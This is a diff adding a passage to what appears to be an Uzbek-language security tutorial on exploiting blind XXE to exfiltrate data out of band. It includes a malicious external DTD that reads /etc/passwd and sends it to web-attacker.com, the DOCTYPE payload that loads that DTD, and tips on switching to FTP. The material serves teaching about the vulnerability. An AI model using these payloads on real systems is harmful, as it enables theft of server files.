@@ -54,3 +54,42 @@ Demak, ko‘zdan yashiringan XXE ni XML parametr entitetlari orqali out-of-band 
 
 Ushbu XXE payload `xxe` nomli XML parametr entitetini e’lon qiladi va so‘ngra uni DTD ichida chaqiradi. Bu hujumchi domeniga DNS so‘rovi va HTTP so‘rov yuborilishiga olib keladi va shu tarzda hujumning muvaffaqiyati tasdiqlanadi.
 
+
+
+
+Ko‘zdan yashiringan (blind) XXE orqali ma’lumotlarni out-of-band (chetkanal) yo‘li bilan o‘g‘irlash
+Out-of-band usullari orqali ko‘zdan yashiringan XXE zaifligini aniqlash yaxshi, lekin bu zaiflikning qanday ekspluatatsiya qilinishi mumkinligini ko‘rsatmaydi. Hujumchi aslida maqsad qilgan narsa — maxfiy ma’lumotlarni o‘g‘irlashdir. Bu ko‘zdan yashiringan XXE orqali amalga oshirilishi mumkin, ammo buning uchun hujumchi o‘z nazorati ostidagi tizimga zararli DTD joylab, so‘ng in-band XXE payload ichidan tashqi DTDni chaqirishi kerak bo‘ladi.
+
+Masalan, /etc/passwd faylining mazmunini o‘g‘irlash uchun zararli DTD quyidagicha bo‘lishi mumkin:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+Ushbu DTD quyidagi qadamlarni bajaradi:
+
+1. `file` nomli XML parametr entitetini e’lon qiladi, uning qiymati `/etc/passwd` faylining mazmunidan iborat bo‘ladi.
+2. `eval` nomli XML parametr entitetini e’lon qiladi; uning qiymati boshqa bir XML parametr entiteti — `exfiltrate` — ning dinamik e’lonidan iborat. `exfiltrate` entiteti hujumchi veb-serveriga HTTP so‘rov yuborilganda `file` entitetining qiymatini URL query satrida uzatadi.
+3. `eval` entiteti ishlatiladi — bu `exfiltrate` entitetining dinamik e’lon qilinishini keltirib chiqaradi.
+4. `exfiltrate` entiteti ishlatiladi — natijada belgilangan URL chaqiriladi va fayl mazmuni hujumchi serveriga uzatiladi.
+
+Hujumchi zararli DTDni o‘z nazorati ostidagi tizimga (odatda o‘zining veb-serveriga) joylashi kerak. Masalan, hujumchi zararli DTDni quyidagi URLda xizmatga qo‘yishi mumkin:
+
+```
+http://web-attacker.com/malicious.dtd
+```
+
+Oxirida hujumchi zaif ilovaga quyidagi XXE payloadni yuborishi lozim:
+
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe; ]>
+```
+
+Ushbu XXE payload `xxe` nomli XML parametr entitetini e’lon qiladi va DTD ichida uni chaqiradi. Bu XML parserni hujumchi serveridan tashqi DTDni yuklashga majbur qiladi va uni joyida (inline) talqin qiladi. Zararli DTD ichida belgilangan qadamlar bajariladi va `/etc/passwd` fayli hujumchi serveriga uzatiladi.
+
+Eslatma
+Ba’zi hollarda bu usul har doim ishlamasligi mumkin — masalan `/etc/passwd` faylidagi newline (qator yakunlash) belgilarini o‘z ichiga olgan ba’zi fayl mazmunlarini uzatib bo‘lmasligi mumkin. Buning sababi ba’zi XML parserlar tashqi entitetdagi URLni chaqirish uchun ishlatadigan API URLda qaysi belgilar ruxsat etilganini tekshiradi. Bunday holatda HTTP o‘rniga FTP protokolidan foydalanish mumkin bo‘ladi. Ba’zan esa newline belgilarini o‘z ichiga olgan ma’lumotni umuman eksfiltraytsiya qilib bo‘lmaydi; shuning uchun `/etc/hostname` kabi qator bo‘lmagan fayl maqsad qilib olinishi mumkin.
+
